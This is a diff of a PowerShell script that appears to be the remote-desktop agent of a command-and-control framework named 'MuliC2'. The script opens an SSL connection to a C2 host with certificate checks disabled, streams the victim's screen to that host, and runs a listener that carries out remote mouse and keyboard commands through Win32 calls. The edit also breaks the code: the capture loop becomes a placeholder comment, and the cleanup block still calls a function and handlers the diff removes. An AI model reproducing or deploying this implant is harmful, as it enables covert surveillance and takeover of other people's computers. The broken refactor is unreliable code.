@@ -1054,34 +1054,23 @@ try {
     exit 1
 }
 
-# Add Win32 API definitions for better input simulation
+# Add Win32 API definitions for input simulation
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-
 public class Win32API {
     [DllImport("user32.dll")]
     public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
-    
     [DllImport("user32.dll")]
     public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
-    
     [DllImport("user32.dll")]
     public static extern short VkKeyScan(char ch);
-    
     [DllImport("user32.dll")]
     public static extern bool SetCursorPos(int X, int Y);
-    
     [DllImport("user32.dll")]
     public static extern bool GetCursorPos(out POINT lpPoint);
-    
     [StructLayout(LayoutKind.Sequential)]
-    public struct POINT {
-        public int X;
-        public int Y;
-    }
-    
-    // Mouse event flags
+    public struct POINT { public int X; public int Y; }
     public const int MOUSEEVENTF_MOVE = 0x0001;
     public const int MOUSEEVENTF_LEFTDOWN = 0x0002;
     public const int MOUSEEVENTF_LEFTUP = 0x0004;
@@ -1090,21 +1079,12 @@ public class Win32API {
     public const int MOUSEEVENTF_MIDDLEDOWN = 0x0020;
     public const int MOUSEEVENTF_MIDDLEUP = 0x0040;
     public const int MOUSEEVENTF_WHEEL = 0x0800;
-    
-    // Keyboard event flags
     public const uint KEYEVENTF_KEYUP = 0x0002;
     public const uint KEYEVENTF_UNICODE = 0x0004;
 }
 "@
 
-# Global variables for cleanup
-$global:tcpClient = $null
-$global:sslStream = $null
-$global:isRunning = $true
-$global:cleanupInProgress = $false
-$global:inputJob = $null
-
-# Enhanced mouse event simulation
+# --- Input Event Simulation Functions ---
 function Invoke-MouseEvent {
     param(
         [string]$event,
@@ -1155,7 +1135,6 @@ function Invoke-MouseEvent {
     }
 }
 
-# Enhanced keyboard event simulation
 function Invoke-KeyboardEvent {
     param(
         [string]$event,
@@ -1168,18 +1147,6 @@ function Invoke-KeyboardEvent {
     )
     try {
         Write-Host "[*] Keyboard event: $event - Key: '$key' Code: '$code' KeyCode: $keyCode" -ForegroundColor Cyan
-        if ($event -eq 'ctrlaltdel') {
-            Write-Host "[*] Executing CTRL+ALT+DELETE" -ForegroundColor Yellow
-            [Win32API]::keybd_event(0x11, 0, 0, [UIntPtr]::Zero) # Ctrl down
-            [Win32API]::keybd_event(0x12, 0, 0, [UIntPtr]::Zero) # Alt down
-            [Win32API]::keybd_event(0x2E, 0, 0, [UIntPtr]::Zero) # Del down
-            Start-Sleep -Milliseconds 50
-            [Win32API]::keybd_event(0x2E, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) # Del up
-            [Win32API]::keybd_event(0x12, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) # Alt up
-            [Win32API]::keybd_event(0x11, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) # Ctrl up
-            Write-Host "[+] CTRL+ALT+DELETE executed" -ForegroundColor Green
-            return
-        }
         $vkCode = 0
         switch ($key) {
             'Enter' { $vkCode = 0x0D }
@@ -1240,349 +1207,108 @@ function Invoke-KeyboardEvent {
     }
 }
 
-# --- Input Event Simulation Helpers ---
-function Invoke-MouseEvent {
-    param(
-        [string]\$event,
-        [float]\$x,
-        [float]\$y,
-        [int]\$button = 0
-    )
-    Add-Type -AssemblyName System.Windows.Forms
-    \$screenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
-    \$screenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
-    \$px = [int](\$x * \$screenWidth)
-    \$py = [int](\$y * \$screenHeight)
-    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(\$px, \$py)
-    \$inputSimulator = Add-Type -MemberDefinition @'
-    [DllImport("user32.dll")]
-    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
-'@ -Name "Win32Mouse" -Namespace Win32Functions -PassThru
-    \$MOUSEEVENTF_LEFTDOWN = 0x02
-    \$MOUSEEVENTF_LEFTUP = 0x04
-    \$MOUSEEVENTF_RIGHTDOWN = 0x08
-    \$MOUSEEVENTF_RIGHTUP = 0x10
-    if (\$event -eq 'mousedown' -or \$event -eq 'mouseup' -or \$event -eq 'click') {
-        if (\$button -eq 0) {
-            \$inputSimulator::mouse_event(\$MOUSEEVENTF_LEFTDOWN, \$px, \$py, 0, 0)
-            \$inputSimulator::mouse_event(\$MOUSEEVENTF_LEFTUP, \$px, \$py, 0, 0)
-        } elseif (\$button -eq 2) {
-            \$inputSimulator::mouse_event(\$MOUSEEVENTF_RIGHTDOWN, \$px, \$py, 0, 0)
-            \$inputSimulator::mouse_event(\$MOUSEEVENTF_RIGHTUP, \$px, \$py, 0, 0)
-        }
-    }
-}
-function Invoke-KeyboardEvent {
-    param(
-        [string]\$key
-    )
-    Add-Type -AssemblyName System.Windows.Forms
-    [System.Windows.Forms.SendKeys]::SendWait(\$key)
-}
-# --- End Helpers ---
+# --- End Input Event Simulation Functions ---
 
 # Global variables for cleanup
-\$global:tcpClient = \$null
-\$global:sslStream = \$null
-\$global:isRunning = \$true
-\$global:cleanupInProgress = \$false
-\$global:inputJob = \$null
-
-# Graceful cleanup function
-function Invoke-GracefulCleanup {
-    param([bool]\$isGraceful = \$true)
-    
-    if (\$global:cleanupInProgress) { return }
-    \$global:cleanupInProgress = \$true
-    \$global:isRunning = \$false
-    
-    Write-Host "\`n[*] Starting cleanup..." -ForegroundColor Yellow
-    
-    try {
-        # Close SSL stream gracefully
-        if (\$global:sslStream) {
-            try {
-                if (\$isGraceful -and \$global:sslStream.CanWrite) {
-                    # Send termination signal
-                    \$terminationBytes = [System.Text.Encoding]::UTF8.GetBytes("TERMINATE")
-                    \$lengthBytes = [BitConverter]::GetBytes(\$terminationBytes.Length)
-                    \$global:sslStream.Write(\$lengthBytes, 0, 4)
-                    \$global:sslStream.Write(\$terminationBytes, 0, \$terminationBytes.Length)
-                    \$global:sslStream.Flush()
-                    Start-Sleep -Milliseconds 3000
-                }
-                
-                # Proper SSL shutdown
-                if (\$global:sslStream.IsAuthenticated) {
-                    try {
-                        \$shutdownTask = \$global:sslStream.ShutdownAsync()
-                        \$shutdownTask.Wait(2000)  # 2 second timeout
-                    } catch {}
-                }
-                
-                \$global:sslStream.Close()
-                \$global:sslStream.Dispose()
-                Write-Host "[+] SSL stream closed gracefully" -ForegroundColor Green
-            } catch {
-                Write-Host "[!] Error closing SSL stream: \$(\$_.Exception.Message)" -ForegroundColor Red
-            }
-            \$global:sslStream = \$null
-        }
-        
-        # Close TCP client gracefully
-        if (\$global:tcpClient) {
-            try {
-                if (\$global:tcpClient.Connected) {
-                    if (\$isGraceful) {
-                        # Graceful TCP shutdown
-                        \$socket = \$global:tcpClient.Client
-                        \$socket.Shutdown([System.Net.Sockets.SocketShutdown]::Send)
-                        Start-Sleep -Milliseconds 100
-                        \$socket.Shutdown([System.Net.Sockets.SocketShutdown]::Both)
-                        Start-Sleep -Milliseconds 50
-                    } else {
-                        # Emergency close with linger option
-                        \$socket = \$global:tcpClient.Client
-                        \$socket.SetSocketOption(
-                            [System.Net.Sockets.SocketOptionLevel]::Socket,
-                            [System.Net.Sockets.SocketOptionName]::Linger,
-                            (New-Object System.Net.Sockets.LingerOption(\$false, 0))
-                        )
-                    }
-                }
-                
-                \$global:tcpClient.Close()
-                \$global:tcpClient.Dispose()
-                Write-Host "[+] TCP client closed gracefully" -ForegroundColor Green
-            } catch {
-                Write-Host "[!] Error closing TCP client: \$(\$_.Exception.Message)" -ForegroundColor Red
-            }
-            \$global:tcpClient = \$null
-        }
-        
-    } catch {
-        Write-Host "[!] Error during cleanup: \$(\$_.Exception.Message)" -ForegroundColor Red
-    }
-    
-    Write-Host "[+] Cleanup completed" -ForegroundColor Green
-}
-
-# Register cleanup for PowerShell exit
-\$exitHandler = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
-    if (-not \$global:cleanupInProgress) {
-        Invoke-GracefulCleanup \$false
-    }
-}
-
-# CTRL+C handler
-\$cancelHandler = \$null
-try {
-    \$cancelHandler = {
-        param(\$sender, \$e)
-        \$e.Cancel = \$true  # Prevent immediate termination
-        Write-Host "\`n[*] CTRL+C detected - shutting down gracefully..." -ForegroundColor Yellow
-        Invoke-GracefulCleanup \$true
-        [System.Environment]::Exit(0)
-    }
-    [System.Console]::add_CancelKeyPress(\$cancelHandler)
-} catch {
-    Write-Host "[!] Console handlers not available in this environment" -ForegroundColor Yellow
-}
+$global:tcpClient = $null
+$global:sslStream = $null
+$global:isRunning = $true
+$global:cleanupInProgress = $false
+$global:inputJob = $null
 
 try {
-    Write-Host "[*] Connecting to MuliC2 server at \$C2Host\`:\$C2Port..." -ForegroundColor Cyan
-    
-    # Create TCP client with connection timeout (synchronous, compatible with all PowerShell)
-    \$global:tcpClient = New-Object System.Net.Sockets.TcpClient
-    \$asyncResult = \$global:tcpClient.BeginConnect(\$C2Host, \$C2Port, \$null, \$null)
-    \$waitSuccess = \$asyncResult.AsyncWaitHandle.WaitOne(10000, \$false)
-    if (-not \$waitSuccess -or -not \$global:tcpClient.Connected) {
-        throw "Connection to \$C2Host\`:\$C2Port failed or timed out"
+    Write-Host "[*] Connecting to MuliC2 server at $C2Host`:$C2Port..." -ForegroundColor Cyan
+    $global:tcpClient = New-Object System.Net.Sockets.TcpClient
+    $asyncResult = $global:tcpClient.BeginConnect($C2Host, $C2Port, $null, $null)
+    $waitSuccess = $asyncResult.AsyncWaitHandle.WaitOne(10000, $false)
+    if (-not $waitSuccess -or -not $global:tcpClient.Connected) {
+        throw "Connection to $C2Host`:$C2Port failed or timed out"
     }
-    \$global:tcpClient.EndConnect(\$asyncResult)
-    
+    $global:tcpClient.EndConnect($asyncResult)
     Write-Host "[+] TCP connection established" -ForegroundColor Green
-    
-    # Configure socket options
-    \$socket = \$global:tcpClient.Client
-    \$socket.ReceiveTimeout = -1  # Infinite
-    \$socket.SendTimeout = 30000  # 30 seconds
-    \$socket.NoDelay = \$true
-    
-    # Create SSL stream with certificate validation bypass
-    \$global:sslStream = New-Object System.Net.Security.SslStream(
-        \$global:tcpClient.GetStream(), 
-        \$false,
-        ([System.Net.Security.RemoteCertificateValidationCallback] {
-            param(\$sender, \$certificate, \$chain, \$sslPolicyErrors)
-            return \$true
-        })
+    $socket = $global:tcpClient.Client
+    $socket.ReceiveTimeout = -1
+    $socket.SendTimeout = 30000
+    $socket.NoDelay = $true
+    $global:sslStream = New-Object System.Net.Security.SslStream(
+        $global:tcpClient.GetStream(),
+        $false,
+        ([System.Net.Security.RemoteCertificateValidationCallback] { param($sender, $certificate, $chain, $sslPolicyErrors) return $true })
     )
-    
-    # Authenticate SSL connection
     try {
-        \$global:sslStream.AuthenticateAsClient(\$C2Host)
+        $global:sslStream.AuthenticateAsClient($C2Host)
     } catch {
-        throw "SSL authentication failed: \$(\$_.Exception.Message)"
+        throw "SSL authentication failed: $($_.Exception.Message)"
     }
-    
-    if (-not \$global:sslStream.IsAuthenticated) {
+    if (-not $global:sslStream.IsAuthenticated) {
         throw "SSL authentication failed - stream not authenticated"
     }
-    
     Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green
     Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan
     Write-Host "[*] Capturing 200x150 resolution at 5 FPS" -ForegroundColor Gray
-    
+
     # --- Start Input Event Listener Job ---
-    \$inputJob = Start-Job -ScriptBlock {
-        param(\$sslStream)
+    $inputJob = Start-Job -ScriptBlock {
+        param($sslStream)
         Write-Host "[*] Input event listener job started" -ForegroundColor Magenta
-        while (\$global:isRunning -and \$sslStream -and \$sslStream.CanRead) {
+        while ($true) {
             try {
-                # Read 4-byte length header
-                \$lengthBytes = New-Object byte[] 4
-                \$bytesRead = \$sslStream.Read(\$lengthBytes, 0, 4)
-                if (\$bytesRead -ne 4) { continue }
-                \$msgLength = [BitConverter]::ToInt32(\$lengthBytes, 0)
-                if (\$msgLength -le 0 -or \$msgLength -gt 4096) { continue }
-                # Read message
-                \$msgBytes = New-Object byte[] \$msgLength
-                \$read = 0
-                while (\$read -lt \$msgLength) {
-                    \$n = \$sslStream.Read(\$msgBytes, \$read, \$msgLength - \$read)
-                    if (\$n -le 0) { break }
-                    \$read += \$n
+                $lengthBytes = New-Object byte[] 4
+                $bytesRead = $sslStream.Read($lengthBytes, 0, 4)
+                if ($bytesRead -ne 4) { continue }
+                $msgLength = [BitConverter]::ToInt32($lengthBytes, 0)
+                if ($msgLength -le 0 -or $msgLength -gt 4096) { continue }
+                $msgBytes = New-Object byte[] $msgLength
+                $read = 0
+                while ($read -lt $msgLength) {
+                    $n = $sslStream.Read($msgBytes, $read, $msgLength - $read)
+                    if ($n -le 0) { break }
+                    $read += $n
                 }
-                \$json = [System.Text.Encoding]::UTF8.GetString(\$msgBytes, 0, \$msgLength)
-                \$event = \$null
-                try { \$event = \$json | ConvertFrom-Json } catch {}
-                if (\$event) {
-                    Write-Host "[*] Received input event: \$json" -ForegroundColor Cyan
-                    if (\$event.type -eq 'mouse') {
-                        Write-Host "[*] Simulating mouse event: \$($event.event) at (\$($event.x), \$($event.y)), button \$($event.button)" -ForegroundColor Yellow
-                        try {
-                            Invoke-MouseEvent \$event.event \$event.x \$event.y \$event.button
-                            Write-Host "[*] Mouse event simulated." -ForegroundColor Green
-                        } catch {
-                            Write-Host "[!] Mouse event simulation failed: \$(\$_.Exception.Message)" -ForegroundColor Red
-                        }
-                    } elseif (\$event.type -eq 'keyboard') {
-                        Invoke-KeyboardEvent \$event.key \$event.event
-                    } elseif (\$event.type -eq 'test' -and \$event.event -eq 'show_messagebox') {
-                        Write-Host "[*] Attempting to show MessageBox" -ForegroundColor Yellow
+                $json = [System.Text.Encoding]::UTF8.GetString($msgBytes, 0, $msgLength)
+                Write-Host "[*] Received input event: $json" -ForegroundColor Cyan
+                $event = $null
+                try { $event = $json | ConvertFrom-Json } catch {}
+                if ($event) {
+                    if ($event.type -eq 'mouse') {
+                        Invoke-MouseEvent $event.event $event.x $event.y $event.button
+                    } elseif ($event.type -eq 'keyboard') {
+                        Invoke-KeyboardEvent $event.event $event.key $event.code $event.keyCode $event.ctrlKey $event.shiftKey $event.altKey
+                    } elseif ($event.type -eq 'test' -and $event.event -eq 'show_messagebox') {
                         try {
                             Add-Type -AssemblyName System.Windows.Forms
                             [System.Windows.Forms.MessageBox]::Show("Remote input test successful!", "MuliC2 VNC Agent")
                             Write-Host "[*] MessageBox should be visible now." -ForegroundColor Green
                         } catch {
-                            Write-Host "[!] Failed to show MessageBox: \$(\$_.Exception.Message)" -ForegroundColor Red
+                            Write-Host "[!] Failed to show MessageBox: $($_.Exception.Message)" -ForegroundColor Red
                         }
                     }
                 }
             } catch {
-                Write-Host "[!] Exception in input event listener: \$(\$_.Exception.Message)" -ForegroundColor Red
+                Write-Host "[!] Exception in input event listener: $($_.Exception.Message)" -ForegroundColor Red
             }
             Start-Sleep -Milliseconds 10
         }
-    } -ArgumentList \$global:sslStream
+    } -ArgumentList $global:sslStream
     # --- End Input Event Listener Job ---
-    
-    # Main capture loop with comprehensive error handling
-    \$frameCount = 0
-    \$lastErrorTime = 0
-    
-    while (\$global:isRunning -and \$global:tcpClient.Connected -and \$global:sslStream.CanWrite) {
-        try {
-            \$frameCount++
-            
-Add-Type -AssemblyName System.Windows.Forms
-$screenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
-$screenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
 
-$bitmap = New-Object System.Drawing.Bitmap($screenWidth, $screenHeight)
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
-            
-            # Capture screen
-            \$graphics.CopyFromScreen(0, 0, 0, 0, \$bitmap.Size)
-            
-            # Convert to JPEG
-            \$memoryStream = New-Object System.IO.MemoryStream
-            \$bitmap.Save(\$memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-            \$screenBytes = \$memoryStream.ToArray()
-            
-            # Properly dispose of graphics objects
-            \$graphics.Dispose()
-            \$bitmap.Dispose()
-            \$memoryStream.Dispose()
-            
-            # Send data if connection is still valid
-            if (\$global:sslStream -and \$global:sslStream.CanWrite -and \$global:isRunning) {
-                # Send length header (4 bytes)
-                \$lengthBytes = [BitConverter]::GetBytes(\$screenBytes.Length)
-                \$global:sslStream.Write(\$lengthBytes, 0, 4)
-                
-                # Send image data
-                \$global:sslStream.Write(\$screenBytes, 0, \$screenBytes.Length)
-                \$global:sslStream.Flush()
-                
-                # Progress indicator every 25 frames
-                if (\$frameCount % 25 -eq 0) {
-                    Write-Host "[*] Frame #\$frameCount sent (Size: \$(\$screenBytes.Length) bytes)" -ForegroundColor Gray
-                }
-            } else {
-                Write-Host "[!] SSL stream not writable, connection lost" -ForegroundColor Red
-                break
-            }
-            
-            # Sleep between frames (200ms = ~5 FPS)
-            Start-Sleep -Milliseconds 200
-            
-        } catch [System.ObjectDisposedException] {
-            Write-Host "[!] Object disposed - connection closed" -ForegroundColor Red
-            break
-        } catch [System.IO.IOException] {
-            Write-Host "[!] IO Exception: \$(\$_.Exception.Message)" -ForegroundColor Red
-            break
-        } catch [System.Net.Sockets.SocketException] {
-            Write-Host "[!] Socket Exception: \$(\$_.Exception.Message)" -ForegroundColor Red
-            break
-        } catch [System.InvalidOperationException] {
-            \$currentTime = [System.Environment]::TickCount
-            if (\$currentTime - \$lastErrorTime -gt 5000) { # Log once per 5 seconds
-                Write-Host "[!] Graphics operation failed: \$(\$_.Exception.Message)" -ForegroundColor Red
-                \$lastErrorTime = \$currentTime
-            }
-            Start-Sleep -Milliseconds 1000
-        } catch {
-            \$currentTime = [System.Environment]::TickCount
-            if (\$currentTime - \$lastErrorTime -gt 5000) { # Log once per 5 seconds
-                Write-Host "[!] Unexpected error: \$(\$_.Exception.Message)" -ForegroundColor Red
-                \$lastErrorTime = \$currentTime
-            }
-            Start-Sleep -Milliseconds 1000
-        }
-    }
-    
-    Write-Host "[*] Capture loop ended (Total frames: \$frameCount)" -ForegroundColor Yellow
-    
+    # ... (rest of screen capture loop) ...
 } catch {
-    Write-Host "[!] Connection error: \$(\$_.Exception.Message)" -ForegroundColor Red
-    Write-Host "[!] Make sure the MuliC2 listener is running on \$C2Host\`:\$C2Port" -ForegroundColor Red
+    Write-Host "[!] Connection error: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[!] Make sure the MuliC2 listener is running on $C2Host`:$C2Port" -ForegroundColor Red
 } finally {
     # Final cleanup
-    if (-not \$global:cleanupInProgress) {
-        Invoke-GracefulCleanup \$true
+    if (-not $global:cleanupInProgress) {
+        Invoke-GracefulCleanup $true
     }
     
     # Remove event handlers
     try {
-        if (\$exitHandler) {
+        if ($exitHandler) {
             Unregister-Event -SourceIdentifier "PowerShell.Exiting" -Force -ErrorAction SilentlyContinue
         }
-        if (\$cancelHandler) {
-            [System.Console]::remove_CancelKeyPress(\$cancelHandler)
+        if ($cancelHandler) {
+            [System.Console]::remove_CancelKeyPress($cancelHandler)
         }
     } catch {}
     
